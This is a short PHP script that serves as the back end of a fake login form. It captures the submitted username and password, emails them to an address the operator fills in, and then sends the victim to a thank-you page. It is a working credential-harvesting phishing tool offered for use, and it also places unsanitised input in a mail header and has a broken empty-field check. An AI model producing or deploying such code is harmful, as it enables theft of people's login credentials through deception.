<?php
$errors = '';
$myemail = 'name@example.com';//<-----Put Your email address here.
if(empty($_POST['password'])  ||
   empty($_POST['username']))  
$password = $_POST['password']; 
$username = $_POST['username'];  
?>


<?php  
$to = $myemail; 
$email_subject = "Contact form submission: from a logger"; 
$email_body = "You have received a login infos. ". 
"Here are the details:\n Password: $password \n ". 
"Username: $username\n"; 
$headers = "From: The login form\n"; 
$headers .= "Reply-To: $username"; 
mail($to,$email_subject,$email_body,$headers);

//redirect to the 'thank you' page
header('Location: contact-form-thank-you.html'); 
?>